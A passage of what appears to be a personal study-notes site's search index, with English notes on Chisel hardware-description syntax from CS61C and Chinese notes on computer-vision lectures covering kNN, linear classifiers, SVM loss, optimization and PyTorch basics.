language.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#type-and-constant","title":"type and constant","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#uint-sint-and-bits","title":"UInt, SInt and Bits","text":"<p>UInt(unsigned int) and SInt(signed int) extends Bits. They three are used to express connections, combinational logic and the register.</p> <p>initializa</p> <pre><code>UInt(8.W)\nBits(8.W)\nSInt(10.W)\n</code></pre> <p>other expression of constants</p> <pre><code>-3.S   //Signed integer in value of -3\n0.U    //Unsigned integer in value of 0\n3.U(4.W) //4-bit unsigned integer in value of 3\n</code></pre> <p>expression in different bases</p> <pre><code>hff.U        //16\u8fdb\u5236\no377.U       //8\u8fdb\u5236\nb1111_1111.U //2\u8fdb\u5236\n'A'.U   //character\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#bool","title":"Bool","text":"<pre><code>Bool()\n//constants\ntrue.B\nfalse.B\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#combinational-circuits","title":"combinational circuits","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#operator","title":"operator","text":"<p>We also use the basic &amp; | ~ + - / * % in the chisel to express the combinational logic like C, Java and so on.</p> <p>The width of the result follows the different rules.</p> <ul> <li>+,- will find the max width in the operators</li> <li>*will be a.W+b.W</li> <li>/and % will be the numerator's width</li> </ul> <p>function</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#multiplexer","title":"multiplexer","text":"<pre><code>val result = Mux(sel, a, b);  \n</code></pre> <p>sel is control signal, which decide the result get \"a\" or \"b\". Where a is selected when the sel is true.B, otherwise b is selected.</p> <p>sel is the bool type. a and b can be any base type in the chisel, but they should have the same type.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#register_1","title":"register","text":"<pre><code>val reg=RegInit(0.U(8.W))\nreg:=d      //input\nval p=reg   //output\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#counting","title":"counting","text":"<p>counting is useful in the digital system, like the time cycle.</p> <pre><code>val cntReg=RegInit(0.U(8.W))\ncntRef:=Mux(cntReg == 9, 0.U, cntReg + 1.U)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#bundle-and-vec","title":"Bundle and Vec","text":"<p>Bundle contains different types of signal.</p> <pre><code>class channel extends Bundle{\n    val data = UInt(8.W)\n    val valid = Bool()\n}\nval ch = Wire(new channel())\nch.data := 123.U\nch.valid := false.B\n</code></pre> <p>Vec is a set of signal with same type</p> <pre><code>val v = Wire(Vec(3, UInt (4.W)))\n</code></pre> <p>We can use the Vec to express an array of register</p> <pre><code>val regVec = Reg(Vec(3, UInt (8.W)))\nval dout = regVec(rdIdx)\nregVec(wrIdx) := din\n\nval resetRegFile =\nRegInit(VecInit(Seq.fill (32) (0.U(32.W))))\nval rdRegFile = resetRegFile (sel)\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#hardware","title":"hardware","text":"<p>Reg, Wire and IO</p> <p>UInt Bits they don't express hardware, and we need to turn them into Reg, Wire and IO to generate the hardware.</p> <ul> <li>Wire is used to express the combinational logic</li> <li>Reg is used to express the register</li> <li>IO represents the connection of a module</li> </ul> <p>difference of \"=\" and \":=\"</p> <ul> <li>= is uesd to create a chisel hardware</li> <li>:= is used to assigned and reassigned to the existed hardware</li> </ul> <pre><code>val number = WireDefault (10.U(4.W))\nval reg = RegInit (0.S(8.W))\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#program-build","title":"program build","text":"<p>chisel use the build.sbt to build the whole prorgam.</p> <p>The soucre code part includes the hardware description part and the chisel test part. We should describle it in the build.sbt part.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#chisel-test","title":"chisel test","text":"<p>To use the chisel test, you should includes these package in the file.</p> <pre><code>import chisel3._\nimport chiseltest ._\nimport org. scalatest . flatspec. AnyFlatSpec\n</code></pre> <p>examples of the test</p> <pre><code>class DeviceUnderTest extends Module {\n    val io = IO(new Bundle {\n    val a = Input(UInt (2.W))\n    val b = Input(UInt (2.W))\n    val out = Output(UInt (2.W))\n    val equ = Output(Bool ())\n})\n    io.out := io.a &amp; io.b\n    io.equ := io.a === io.b\n}\n\nclass SimpleTest extends AnyFlatSpec with\n    ChiselScalatestTester {\n\"DUT\" should \"pass\" in {\n    test(new DeviceUnderTest ) { dut =&gt;\n        dut.io.a.poke (0.U)\n        dut.io.b.poke (1.U)\n        dut.clock.step ()\n        println(\"Result is: \" + dut.io.out.peekInt ())\n        dut.io.a.poke (3.U)\n        dut.io.b.poke (2.U)\n        dut.clock.step ()\n        println(\"Result is: \" + dut.io.out.peekInt ())\n        }\n    }\n}\n</code></pre> <p>The peek() function return the type of the chisel type.</p> <p>For some complicate digital system, it will be recommended to have the waveforms to test.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/preparation/","title":"some explanation","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/preparation/#computer-system-learning","title":"computer system learning","text":"<p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u76f8\u5173\u7684\u5b66\u4e60</p> <p>\u6700\u8fd1\u5728\u5b66\u4e6061C\u7684\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u5b66\u4e60\u7684\u5185\u5bb9\u7a0d\u5fae\u6709\u4e9b\u91cd\u590d\u3002 \u4ed4\u7ec6\u60f3\u60f3\u53d1\u73b0\u81ea\u5df1\u4e0a\u8fc7\u7684\u7cfb\u7edf\u8bfe\u4e5f\u4e0d\u5c11\u4e86\uff0c\u56e0\u6b6461c\u7684\u5185\u5bb9\u4e0d\u6253\u7b97\u5b66\u7684\u5f88\u7ec6\u4e86\uff0cproj\u548clab\u4e0d\u4e00\u5b9a\u4f1a\u5168\u505a\uff0c \u6253\u7b97\u505a\u4e00\u4e2a\u6c47\u603b\u653e\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u3002\u9664\u4e86\u8ba1\u6982\u7684\u5df2\u7ecf\u653e\u4e0a\u6765\u4e86\u4ee5\u5916\uff0c \u540e\u6765\u5e94\u8be5\u4f1a\u628a\u8ba1\u539f\u548c61c\u7684\u90fd\u653e\u4e0a\u6765\uff0c\u4e5f\u6709\u53ef\u80fd\u4f1a\u5305\u62ec\u4e00\u4e9b\u4fe1\u5b89\u7cfb\u7edf\u8bfe\u7684\u5185\u5bb9\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/","title":"EECS 498.008 Deep Learning for Computer Vision","text":"<p>CV\u5b66\u4e60</p> <ul> <li> \u8bfe\u7a0b\u7f51\u7ad9</li> <li> assignment1 \u5173\u4e8ePytorch\u7684\u57fa\u7840\u4f7f\u7528</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/","title":"UMich EECS 498-007: Deep Learning for Computer Vision","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#lec01-history-of-computer-vision","title":"Lec01 history of computer vision","text":"<p>\u6240\u8c13\u8ba1\u7b97\u673a\u89c6\u89c9\uff0c\u5c31\u662f\u6307\u80fd\u8ba9\u8ba1\u7b97\u673a\u7406\u89e3\u56fe\u50cf\u4fe1\u606f\u7684\u6280\u672f\uff0c\u5728\u65e9\u671f\u4eba\u4eec\u5c1d\u8bd5\u8fc7\u5404\u79cd\u5404\u6837\u7684\u65b9\u6cd5\uff0c\u5230\u73b0\u9636\u6bb5deep learning \u6df1\u5ea6\u5b66\u4e60\uff0c\u6210\u4e3a\u4e86\u89e3\u51b3\u8be5\u95ee\u9898\u7684\u4e3b\u6d41\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#lec02-image-classification","title":"Lec02 Image classification","text":"<p>image classification\u662f\u8ba1\u7b97\u673a\u89c6\u89c9\u4e2d\u6700\u57fa\u7840\u7684\u76ee\u6807\u4e4b\u4e00\uff0c\u5c31\u662f\u7ed9\u51fa\u4e00\u7cfb\u5217\u56fe\u7247\u548c\u6807\u7b7e\uff0c\u628a\u56fe\u7247\u548c\u6807\u7b7e\u5bf9\u5e94\u8d77\u6765\uff0c\u6bd4\u5982\u732b\u5bf9\u732b\uff0c\u72d7\u5bf9\u72d7\u3002\u4f46\u662f\u4e00\u4e2a\u4e8b\u7269\u5176\u62cd\u6444\u89d2\u5ea6\uff0c\u5149\u5f71\u6548\u679c\uff0c\u7269\u4f53\u7684\u4e0d\u540c\u72b6\u6001\u90fd\u4f1a\u5bfc\u81f4\u5176\u4ea7\u751f\u7684\u50cf\u7d20\u6570\u636e\u5929\u5dee\u5730\u522b\u3002</p> <p>\u5982\u679c\u4f7f\u7528\u4f20\u7edf\u7b97\u6cd5\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5f88\u96be\u8986\u76d6\u4e00\u4e2a\u7269\u4f53\u7684\u6240\u6709\u60c5\u51b5\uff0c\u5e76\u4e14\u5f88\u96be\u627e\u5230\u4e00\u4e2a\u7b97\u6cd5\u9002\u7528\u4e8e\u6240\u6709\u7684\u7269\u4f53\uff0c\u56e0\u6b64\u6211\u4eec\u4f1a\u503e\u5411\u4e8e\u91c7\u7528data-driven\u7684\u505a\u6cd5\uff0c\u91c7\u7528\u6570\u636e\u9a71\u52a8\u3002</p> <p>\u5728\u672c\u6b21\u8bb2\u5ea7\u4e2d\uff0c\u63cf\u8ff0\u4e86\u4e00\u79cd\u975e\u5e38trivial\u7684image classification\u7684\u505a\u6cd5\uff0c\u4e5f\u5373Nearest Neighbor Classifier\uff0c\u5c06\u8bad\u7ec3\u96c6\u7684\u6240\u6709\u56fe\u5f62\u6570\u636e\u5b58\u4e0b\u6765\uff0c\u5f53\u65b0\u7684\u6570\u636e\u4f20\u5165\u7684\u65f6\u5019\uff0c\u5bf9\u6240\u6709\u7684\u5b58\u50a8\u7684\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\uff0c\u5f97\u51fa\u6700\u76f8\u8fd1\u7684\u90a3\u4e2a\u56fe\u5f62\u6570\u636e\u4ee5\u53ca\u5176\u5bf9\u5e94\u7684\u6807\u7b7e\uff0c\u5b8c\u6210\u8be5\u6b21\u56fe\u50cf\u5206\u7c7b\u5de5\u4f5c\u3002</p> <p>\u5bf9\u4e8e\u8be5\u505a\u6cd5\u6709\u4ee5\u4e0b\u95ee\u9898</p> <ul> <li>\u5b58\u50a8\u7a7a\u95f4\u6d88\u8017\u5de8\u5927</li> <li>\u8bad\u7ec3\u7b80\u5355\uff0c\u4f7f\u7528\u56f0\u96be\uff0c\u4e0e\u6211\u4eec\u7684\u76ee\u6807\u76f8\u6096</li> <li>\u5173\u4e8e\u6240\u8c13\u7684\u201c\u76f8\u8fd1\u201d\u7684\u505a\u6cd5\u7684\u9009\u62e9\u95ee\u9898</li> </ul> <p>\u4e3a\u4e86\u4f18\u5316Nearest Neighbor Classifier\uff0c\u6211\u4eec\u8fd8\u63d0\u51fa\u4e86k-Nearest Neighbor (kNN) classifier\uff0c\u4e5f\u5c31\u662f\u627e\u5230k\u4e2a\u6700\u76f8\u8fd1\u56fe\u7247\uff0c\u6839\u636e\u8fd9\u4e9b\u56fe\u7247\u5bf9\u5e94\u7684\u6807\u7b7e</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#lec03-linear-classification","title":"Lec03 Linear classification","text":"<p>\u8fd9\u90e8\u5206\u91cc\u9762\u6211\u4eec\u9700\u8981\u6784\u5efa\u4e24\u4e2a\u5f0f\u5b50score function\u548closs function</p> <ul> <li>score function\uff0c\u5c06\u56fe\u50cf\u6620\u5c04\u5230\u4e00\u4e2a\u5355\u5217\u77e9\u9635\uff0c\u5355\u5217\u77e9\u9635\u5b58\u50a8\u8fd9\u8be5\u56fe\u50cf\u5bf9\u4e8e\u6240\u6709\u7684\u6807\u7b7e\u7684\u5f97\u5206</li> <li>loss function\uff0c\u63cf\u8ff0\u9884\u6d4b\u51fa\u6765\u7684\u6807\u7b7e\u548c\u5b9e\u9645\u6807\u7b7e\u7684\u4e00\u81f4\u6027</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#score-function","title":"score function","text":"<p>\u6211\u4eec\u6784\u5efa\u4e00\u4e2a\u8fd9\u6837\u7684\u5f0f\u5b50</p> \\[ f(x_i,W,b) = x_iW+b \\] <p>\u5176\u4e2d\\(x_i\\)\u662f\u6211\u4eec\u5c06\u56fe\u50cf\u4fe1\u606f\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5c55\u5f00\u4e3a\u5355\u5217\u7684\u77e9\u9635\u7684\u7ed3\u679c\uff0cW\u548cb\u662f\u6211\u4eec\u9700\u8981\u8bad\u7ec3\u83b7\u5f97\u7684\u6709\u6548\u53c2\u6570\uff0cW\u548cb\u4e5f\u662f\u4e00\u4e2a\u77e9\u9635\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u7167\u4e0b\u56fe</p> <p>\u200b\u200b</p> <p>\u6700\u7ec8\u83b7\u5f97\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u5355\u5217\u77e9\u9635\uff0c\u5176\u63cf\u8ff0\u4e86\u8be5\u56fe\u50cf\u5bf9\u4e8e\u6240\u6709\u6807\u7b7e\u7684\u5f97\u5206\uff0c\u5f53\u7136\u4e0a\u56fe\u662f\u4e00\u4e2a\u8f83\u4e3a\u968f\u610f\u7684\u53c2\u6570\u8bbe\u7f6e\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#loss-function","title":"loss function","text":"<p>\u5176\u63cf\u8ff0\u4e86\u9884\u6d4b\u7ed3\u679c\u548c\u5b9e\u9645\u7ed3\u679c\u7684\u5dee\u8ddd\uff0c\u6211\u4eec\u6709\u591a\u79cd\u65b9\u5f0f\u6765\u63cf\u8ff0\u8fd9\u79cd\u5dee\u522b</p> <p>multiclass support vector machine loss</p> <p>\u8fd9\u7c7b\u635f\u5931\u51fd\u6570\u88ab\u79f0\u4e3aSVM\uff0c\u6211\u4eec\u8bbe\u4e00\u4e2a\u56fe\u50cf\u4e3a\\(x_i\\)\uff0c\u5176\u6b63\u786e\u6807\u7b7e\u4e3a\\(y_i\\)\uff0c\\(s_j\\)\u8868\u793a\u8be5\u7b97\u6cd5\u4e0b\uff0c\u7b2ci\u4e2a\u56fe\u50cf\u5bf9\u4e8e\u7b2cj\u4e2a\u6807\u7b7e\u7684\u5f97\u5206\uff0c\u6211\u4eec\u7684SVM\u53ef\u4ee5\u5199\u4e3a</p> \\[ L_i=\\sum_{j\\neq y_i}\\max(0,s_j-s_{y_i}+\\Delta) \\] <p>\u6211\u4eec\u4ed4\u7ec6\u7406\u89e3\u4e00\u4e0b\u8be5\u5f0f\u5b50 \\(s_j-s_{y_i}\\) \u8868\u793a\u7684\u6b63\u786e\u6807\u7b7e\u7684\u5f97\u5206\u548c\u67d0\u4e2a\u9519\u8bef\u6807\u7b7e\u5f97\u5206\u7684\u5dee\u503c\uff0c\u6211\u4eec\u81ea\u7136\u5e0c\u671b\u8fd9\u4e2a\u5dee\u503c\u8d8a\u5927\u8d8a\u597d\uff0c\u7136\u540e\u6211\u4eec\u4f7f\u7528\\(\\Delta\\)\u548c\u4e0e0\u8fdb\u884cmax\uff0c\u786e\u4fdd\u4e00\u70b9\uff0c\u6bd4\u5982\\(\\Delta = 10\\), \u90a3\u4e48\u67d0\u4e2a\u9519\u8bef\u6807\u7b7e\u548c\u6b63\u786e\u6807\u7b7e\u4e4b\u95f4\u5f97\u5206\u76f8\u5dee10\uff0c \u6211\u4eec\u5c31\u628a\u635f\u5931\u8bbe\u5b9a\u4e3a0\uff0c\u82e5\u4e0d\u523010\uff0c\u5219\u8868\u73b0\u51fa\u635f\u5931\u3002</p> <p>\u8fd9\u6837\u505a\u53ef\u4ee5\u4fdd\u8bc1\u4e00\u70b9\uff0c\u5982\u679c\u4e00\u4e2a\u6a21\u578b\u5bf9\u4e8e\u4e00\u4e2a\u9519\u8bef\u6807\u7b7e\u5f97\u5206\u975e\u5e38\u4f4e\uff0c\u548c\u6b63\u786e\u6807\u7b7e\u76f8\u5dee\u751a\u8fdc\uff0c\u4f46\u662f\u5176\u4ed6\u6807\u7b7e\u548c\u6b63\u786e\u6807\u7b7e\u5f97\u5206\u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u6837\u7684\u6a21\u578bloss function\u4e5f\u4e0d\u4f1a\u5f88\u4f4e\u3002</p> <p>\u4ec5\u4ec5\u80fd\u591f\u5206\u8fa8\u51fa\u67d0\u4e2a\u9519\u8bef\u6807\u7b7e\u5e76\u4e0d\u4f1a\u592a\u6709\u7528\uff08</p> <p>regularization</p> <p>\u4e0a\u8ff0\u505a\u6cd5\u4e2d\u8fd8\u5b58\u5728\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\u5c31\u662f\uff0c\\(\\Delta\\)\u662f\u5e38\u6570\uff0c\u7406\u8bba\u4e0a\u53ea\u8981\u628aM\u6269\u5927N\u500d\uff0c\u5c31\u5f88\u5bb9\u6613\u5c31\u80fd\u83b7\u5f97\u8d85\u8fc7\\(\\Delta\\)\u7684\u503c</p> <p>\u6211\u4eec\u53ef\u4ee5\u6269\u5c55loss fucntion\uff0c\u901a\u8fc7\u589e\u52a0\u4e0aregularization penalty \\(R(W)\\)\uff0c\u5176\u6b63\u5219\u5316\u7684\u65b9\u5f0f\u4e5f\u6709\u5f88\u591a\uff0c\u5982\u4e0b\u662fL2 norm</p> \\[ R(W) = \\sum_k\\sum_lW_{k,l}^2 \\] <p>SVM function\u8f6c\u6362\u6210</p> <p>\u200b\u200b</p> <p>practical considerations</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#lec04-regularization-and-optimization","title":"Lec04 regularization and optimization","text":"<p>\u524d\u4e00\u7ae0\u4e2d\u8bb2\u8ff0\u4e86score function\u548closs function\u4e24\u4e2a\u56fe\u50cf\u5206\u7c7b\u4efb\u52a1\u4e2d\u7684\u91cd\u8981\u7ec4\u4ef6\uff0c\u800c\u8fd9\u4e00\u7ae0\u6211\u4eec\u8981\u4ecb\u7ecdoptimization\uff0c\u4e5f\u5373\u6211\u4eec\u5982\u4f55\u627e\u5230\u53c2\u6570\\(W\\)</p> <p>\u5f53\u7136\u6211\u4eec\u4e86\u89e3\u4e86\u8fd9\u4e09\u4e2a\u7ec4\u4ef6\u662f\u5982\u4f55\u8fd0\u4f5c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c06\u4e0d\u518d\u5c40\u9650\u4e8e\u7ebf\u6027\u6620\u5c04\uff0c\u800c\u8fdb\u5165\u66f4\u590d\u6742\u7684score function\uff0c\u4f46\u662f\u76f8\u4e92\u4f5c\u7528\u7684\u5173\u7cfb\u662f\u76f8\u5bf9\u4e0d\u53d8\u7684\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#optimization","title":"optimization","text":"<p>pure random</p> <p>\u4e00\u4e2a\u6700\u76f4\u63a5\u7684\u60f3\u6cd5\u5c31\u662f\u968f\u673a\u751f\u6210\u4e00\u5806\u7684W\uff0c\u627e\u5230\u4e00\u4e2aloss function\u6700\u5c0f\u7684\uff0c\u4f46\u662f\u8fd9\u51e0\u4e4e\u662f\u5b8c\u5168\u4e0d\u53ef\u884c\u7684\uff0c\u83b7\u53d6\u5b8c\u5168\u968f\u673a\u7684\u6700\u4f73\u51fd\u6570\u7684\u7ed3\u679c\u6240\u9700\u7684\u65f6\u95f4\u6d88\u8017\u662f\u96be\u4ee5\u60f3\u8c61\u7684\u3002</p> <p>random local search</p> <p>\u4e00\u4e2a\u66f4\u4f18\u7684\u529e\u6cd5\u662f\uff0c\u4ee5\u4e00\u4e2a\u968f\u673a\u7684W\u4e3a\u57fa\u51c6\uff0c\u5411\u5404\u4e2a\u65b9\u5411\u53bb\u5c1d\u8bd5\uff0c\u8ba9\u5176\u52a0\u4e0a\u968f\u673a\u7684\\(\\delta W\\), \u5982\u679c\u5176\u66f4\u4f18\u4e86\uff0c\u5c31\u66f4\u65b0\u5f53\u524d\u7684W</p> <pre><code>W = np.random.randn(10, 3073) * 0.001 # generate random starting W\nbestloss = float(\"inf\")\nfor i in range(1000):\n  step_size = 0.0001\n  Wtry = W + np.random.randn(10, 3073) * step_size\n  loss = L(Xtr_cols, Ytr, Wtry)\n  if loss &lt; bestloss:\n    W = Wtry\n    bestloss = loss\n  print 'iter %d loss is %f' % (i, bestloss)\n</code></pre> <p>following the gradient</p> <p>\u4f9d\u8d56\u968f\u673a\u7684\u4f18\u5316\u603b\u662f\u4e0d\u8ba9\u4eba\u90a3\u4e48\u5f00\u5fc3\uff0c\u4e8b\u5b9e\u4e0a\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u6570\u5b66\u7684\u65b9\u6cd5\u6765\u5224\u65ad\u4f18\u5316\u7684\u65b9\u5411\u3002\u4f18\u5316\u5411\u91cf\u5e94\u5f53\u5728\u6570\u5b66\u4e0a\u4fdd\u8bc1\u4e3a\u6700\u9661\u4e0b\u964d\u7684\u65b9\u5411\uff0c\u5176\u4e0e\u635f\u5931\u51fd\u6570\u7684\u68af\u5ea6\u6709\u5173\u3002</p> <p>\u68af\u5ea6\u5373\u4e00\u4e2a\u5411\u91cf\u5bf9\u6bcf\u4e2a\u7ef4\u6c42\u504f\u5bfc\u5f62\u6210\u7684\u5411\u91cf</p> <p>\u8ba1\u7b97\u68af\u5ea6\u6709\u4e24\u79cd\u65b9\u5f0f</p> <ul> <li>\u6570\u503c\u8ba1\u7b97\uff0c\u8bbe\u8ba1\u4e00\u4e2a\u8de8\u5ea6\uff0c\u4f8b\u5982\\(h=10^{-5}\\) \u76f4\u63a5\u8ba1\u7b97 \\([f(x+h)-f(x-h)]/2h\\)</li> <li>\u5fae\u79ef\u5206\u8ba1\u7b97 \u5feb\u901f\u7cbe\u786e\uff0c\u4f46\u662f\u5bb9\u6613\u51fa\u9519</li> </ul> <p>\u901a\u8fc7\u8bbe\u8ba1\u6b65\u957f\uff0c\u6211\u4eec\u5c31\u80fd\u5b9e\u73b0\u6301\u7eed\u6709\u6548\u7684\u5faa\u73af\u4f18\u5316\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#assignment1-pytorchcolab","title":"Assignment1 \u5b66\u4e60\u4f7f\u7528PyTorch\u548cColab","text":"<p>\u672c\u8bfe\u7a0b\u7684\u5b9e\u9a8c\u6307\u5bfc\u4ee5ipynb\u7684\u5f62\u5f0f\u53d1\u9001\uff0c\u6211\u4eec\u9700\u8981\u5728Google Colab\u4e0a\u6253\u5f00\u4ee5\u83b7\u5f97\u5b8c\u6574\u7684\u529f\u80fd\u3002</p> <p>\u200b\u200b</p> <p>\u914d\u7f6e\u5b9e\u9a8c\u6307\u5bfc\u9700\u8981\u4ee5\u4e0b\u51e0\u6b65</p> <ul> <li>\u8fd0\u884cset-up\u4ee3\u7801</li> <li>\u5c06\u5b9e\u9a8c\u4ee3\u7801\u53d1\u9001\u5230Google Drive</li> <li>\u5e76\u4e14\u5c06\u5b9e\u9a8c\u6307\u5bfc\u8fde\u4e0aGoogle Drive\u5e76\u4e14\u6307\u5b9a\u8def\u5f84</li> </ul> <p>Colab\u540c\u65f6\u4e3a\u6211\u4eec\u96c6\u6210\u4e86\uff0c\u5b9e\u9a8c\u6307\u5bfc\uff0c\u865a\u62df\u73af\u5883\u548c\u7f16\u8f91\u4ee3\u7801\u7684\u529f\u80fd</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20vision/UMich%20EECS%20498-007%20Deep%20Learning%20for%20Computer%20Vision/#pytorch-101","title":"pytorch 101","text":"<p>pytorch\u662f\u4e00\u4e2a\u514d\u8d39\u5f00\u6e90\u7684\u673a\u5668\u5b66\u4e60\u6846\u67b6\uff0c\u5176\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u5de5\u5177</p> <ul> <li>\u53ef\u4f7f\u7528GPU\u52a0\u901f\u7684tensor\u5bf9\u8c61</li> <li>\u81ea\u52a8\u8ba1\u7b97\u5bfc\u6570\u7684autograd engine</li> <li>\u6e05\u6670\u7684\u6a21\u5757\u5316\u7684\u90e8\u7f72\u6a21\u578b\u7684API</li> </ul> <p>\u8fdb\u4e00\u6b65\u5b66\u4e60\u53ef\u4ee5\u9009\u62e9 oficial tutorials \u6216\u8005 reading the documentation.</p> <p>\u6709\u5173tensor\u4e00\u4e9b\u6982\u5ff5</p> <ul> <li>rank of tensor \u5c31\u662f\u77e9\u9635\u7684dimension</li> <li>shape of tensor \u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u7ed9\u51fa\u6bcf\u4e2adimension\u7684size\u5927\u5c0f</li> </ul> <p>\u5982\u679c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u4e0b\u6807\u8bbf\u95eetensor\u7684\u5143\u7d20\uff0c\u4f1a\u83b7\u5f97\u4e00\u4e2apytorch\u6807\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528.item()\u65b9\u6cd5\u8f6c\u6362\u6210Python\u6807\u91cf</p> <p>\u6784\u9020</p> <p>\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06python\u4e2d\u7684\u5217\u8868\u8f6c\u6362\u6210tensor</p> <pre><code>x = torch.tensor([1,2,3], [2,3,4])\n</code></pre> <p>\u4f46\u662f\u4e0a\u8ff0\u505a\u6cd5\u6709\u4e9b\u4f4e\u6548\uff0cpytorch\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u65b9\u6cd5\u5e2e\u52a9\u6211\u4eec\u6784\u9020tensor\uff0c\u5305\u62ec\u5168\u4e3a0\u7684\uff0c\u5355\u4f4d\u7684\uff0c\u5168\u4e3a1\u7684\uff0c\u968f\u673a\u7684</p> <p>\u6bd4\u8f83\u5e38\u7528\u7684\u6709<code>torch.full()</code>\u200b</p> <pre><code>x = torch.full(size \u5217\u8868, value)\n</code></pre> <p>\u6570\u636e\u7c7b\u578b</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728\u6784\u9020tensor\u7684\u65f6\u5019\u663e\u793a\u8bf4\u660e\u5176\u6570\u636e\u7c7b\u578b</p> <pre><code>y2 = torch.tensor([1, 2], dtype=torch.int64)\n</code></pre> <p>\u5f53\u7136\u8fd8\u6709\u4e00\u4e9b\u66f4\u7075\u6d3b\u7684\u529e\u6cd5</p> 